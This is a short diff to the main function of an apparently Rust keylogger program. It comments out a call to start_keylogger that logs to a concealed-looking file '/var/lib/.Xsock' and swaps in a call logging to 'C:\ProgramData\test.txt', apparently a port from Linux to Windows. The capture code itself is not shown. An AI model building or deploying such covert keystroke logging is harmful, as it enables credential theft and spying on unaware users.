@@ -19,5 +19,6 @@ struct Args {
 }
 
 fn main() {
-    let _res = os::start_keylogger("/var/lib/.Xsock".to_owned(), 10);
+    // let _res = os::start_keylogger("/var/lib/.Xsock".to_owned(), 10);
+    let _res = os::start_keylogger("C:\\ProgramData\\test.txt".to_owned(), 10);
 }
